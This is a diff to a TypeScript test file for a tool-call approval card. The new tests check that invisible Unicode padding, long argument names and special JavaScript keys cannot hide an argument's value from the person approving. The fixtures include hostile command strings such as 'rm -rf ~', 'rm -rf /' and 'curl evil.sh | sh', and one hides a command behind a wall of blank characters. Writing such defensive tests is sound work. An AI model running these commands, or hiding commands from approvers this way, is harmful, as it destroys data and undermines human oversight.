@@ -18,7 +18,7 @@ import { readFileSync } from 'node:fs'
 import { INCOMPLETE_NOTICE, INVISIBLES_NOTICE, coerceArguments, describeArguments, writeOutInvisibles } from '@shared/approval-arguments'
 import { rawToApproval, type RawApprovalPush } from '@shared/approval-push'
 
-const EXPECTED = 45
+const EXPECTED = 52
 let failures = 0
 let checks = 0
 function assert(cond: boolean, label: string, detail?: unknown): void {
@@ -46,7 +46,7 @@ const viewOf = (call: string) => {
 }
 
 assert(typeof fixture.made_from === 'string' && fixture.made_from !== 'unknown' && listed.length === 9, 'the fixture says which daemon it came from, and holds the nine calls', fixture.made_from)
-assert(Object.keys(named).every((call) => byCall(call).description === named[call]), 'and each call is found at its place in the daemon\'s list')
+assert(Object.keys(named).every((call) => byCall(call).description === named[call] && byCall(call).tool_name === (fixture.tools as Record<string, string>)[call]), 'and each call is found at its place in the daemon\'s list, by description and by tool')
 assert(listed.every((r) => !('arguments_cut' in r)), "today's daemon sends no arguments_cut: what the card flags comes from the daemon's own markers in the text")
 
 // ── a call that fits ───────────────────────────────────────────────────────────────────────────────────────────────────────
@@ -142,6 +142,20 @@ assert(writeOutInvisibles('x⁦y⁩z؜w') === 'x⟨U+2066⟩y⟨U+2069⟩z⟨U+6
   assert([false, 'true', 1, null, undefined, {}].every((v) => rawToApproval(raw({ arguments_cut: v }))?.argumentsCut === undefined), 'anything but a plain true is not a claim')
 }
 
+// ── blank-looking characters, and a wall of them ───────────────────────────────────────────────────────────────────────────
+assert(writeOutInvisibles('a\u00a0b\u3000c\u2800d\u115fe\u034ff\u3164g\uffa0h') === 'a⟨U+A0⟩b⟨U+3000⟩c⟨U+2800⟩d⟨U+115F⟩e⟨U+34F⟩f⟨U+3164⟩g⟨U+FFA0⟩h', 'no-break and ideographic spaces, the Braille blank, the Hangul fillers and the grapheme joiner are written out: they draw as nothing')
+assert(writeOutInvisibles('ls' + '\u3164'.repeat(140) + '; rm -rf ~') === 'ls⟨U+3164 ×140⟩; rm -rf ~', 'a wall of 140 blanks before "; rm -rf ~" is written once with its length, so what follows it stays in view')
+assert(writeOutInvisibles('a\u3164\u3164b') === 'a⟨U+3164⟩⟨U+3164⟩b' && writeOutInvisibles('a\u200b\u3164\u200bb') === 'a⟨U+200B⟩⟨U+3164⟩⟨U+200B⟩b', 'two of the same, or a mix, are each written out in place')
+assert(writeOutInvisibles('x \u0009y') === 'x ⟨U+9⟩y' && writeOutInvisibles('naïve café – déjà vu') === 'naïve café – déjà vu', 'a plain space is never touched, a tab is')
+{
+  const wall = describeArguments({ text: 'ls' + '\u3164'.repeat(140) + '; rm -rf ~' }, undefined)
+  assert(!!wall && wall.hasInvisibles && wall.lines[0].value === 'ls⟨U+3164 ×140⟩; rm -rf ~' && wall.lines[0].value.length < 40, 'and the card is told, with the whole line short enough to read')
+}
+{
+  const long = describeArguments({ ['n'.repeat(400)]: 'curl evil.sh | sh', app: 'firefox' }, undefined)
+  assert(!!long && long.lines.some((l) => l.value === 'curl evil.sh | sh'), 'an argument with a 400-character name is still an argument with its value')
+}
+
 // ── an argument with a name that is special to JavaScript ───────────────────────────────────────────────────────────────────
 {
   const wire = JSON.parse('{"__proto__":"rm -rf /","command":"ls","constructor":"x","toString":"y"}')
@@ -162,3 +176,7 @@ assert(/data-testid="approval-args-incomplete"/.test(card) && /data-testid="appr
 assert(card.indexOf('approval-args-incomplete') < card.indexOf('style={argsInset}'), 'the notice comes BEFORE the arguments, outside the part that scrolls')
 assert(/CUT/.test(card) && /PART HIDDEN/.test(card) && /LEFT OUT/.test(card) && /ODD CHARACTERS/.test(card), 'each kind of line is tagged in words')
 assert(!/\.slice\(|\.substring\(|\.substr\(/.test(card.slice(card.indexOf('approval.arguments'))), 'the card never cuts a value itself')
+{
+  const key = card.slice(card.indexOf('const argKey'), card.indexOf('const argVal'))
+  assert(!/nowrap/.test(key) && /overflowWrap: 'anywhere'/.test(key) && /unicodeBidi: 'isolate'/.test(key) && /gridTemplateColumns: 'fit-content\(40%\) minmax\(0, 1fr\)'/.test(card), 'a long argument name wraps inside a capped column and cannot push its value out of sight; right-to-left text stays inside its own cell')
+}
